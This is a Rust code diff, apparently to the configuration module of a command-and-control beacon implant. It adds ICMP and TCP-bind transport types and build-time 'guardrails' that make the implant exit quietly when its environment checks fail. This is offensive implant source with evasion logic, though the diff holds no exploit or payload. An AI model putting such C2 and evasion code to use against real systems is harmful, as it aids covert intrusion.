@@ -1,4 +1,5 @@
 use anyhow::Context;
+use guardrails::Guardrail;
 use host_unique::HostIDSelector;
 use url::Url;
 use uuid::Uuid;
@@ -89,10 +90,12 @@ pub const RUN_ONCE: bool = run_once!();
 fn get_transport_type(uri: &str) -> crate::c2::transport::Type {
     match uri.split(":").next().unwrap_or("unspecified") {
         "dns" => crate::c2::transport::Type::TransportDns,
+        "icmp" => crate::c2::transport::Type::TransportIcmp,
         "http1" => crate::c2::transport::Type::TransportHttp1,
         "https1" => crate::c2::transport::Type::TransportHttp1,
         "https" => crate::c2::transport::Type::TransportGrpc,
         "http" => crate::c2::transport::Type::TransportGrpc,
+        "tcp" => crate::c2::transport::Type::TransportTcpBind,
         _ => crate::c2::transport::Type::TransportUnspecified,
     }
 }
@@ -106,7 +109,7 @@ fn get_transport_type(uri: &str) -> crate::c2::transport::Type {
  *
  * Example: https://example.com?interval=10&extra={"key":"value"}&jitter=0.5
  */
-fn parse_transports(uri_string: &str) -> Vec<Transport> {
+pub fn parse_transports(uri_string: &str) -> Vec<Transport> {
     uri_string
         .split(';')
         .filter(|s| !s.trim().is_empty())
@@ -121,7 +124,7 @@ fn parse_transports(uri_string: &str) -> Vec<Transport> {
  * Helper function to parse DSN query parameters
  * Returns a Transport struct
  */
-fn parse_dsn(uri: &str) -> anyhow::Result<Transport> {
+pub fn parse_dsn(uri: &str) -> anyhow::Result<Transport> {
     // Parse as a URL to extract query parameters
     let parsed_url = Url::parse(uri).with_context(|| format!("Failed to parse URI '{}'", uri))?;
 
@@ -195,6 +198,24 @@ fn parse_host_unique_selectors() -> Vec<Box<dyn HostIDSelector>> {
     final_res
 }
 
+fn parse_guardrails() -> Vec<Box<dyn Guardrail>> {
+    let final_res = match option_env!("IMIX_GUARDRAILS") {
+        Some(json) => {
+            if let Some(res) = guardrails::from_imix_guardrails(json.to_owned()) {
+                return res;
+            } else {
+                #[cfg(debug_assertions)]
+                log::error!(
+                    "Error parsing guardrails string (should have been caught at build time)"
+                );
+                return guardrails::defaults();
+            }
+        }
+        None => guardrails::defaults(),
+    };
+    final_res
+}
+
 /*
  * Config methods.
  */
@@ -225,6 +246,13 @@ impl Config {
             transports,
             active_index: 0,
         };
+
+        let guardrails = parse_guardrails();
+        if !guardrails::check_guardrails(guardrails) {
+            #[cfg(debug_assertions)]
+            log::error!("Guardrails failed, exiting");
+            std::process::exit(0);
+        }
 
         let info = crate::c2::Beacon {
             identifier: beacon_id,
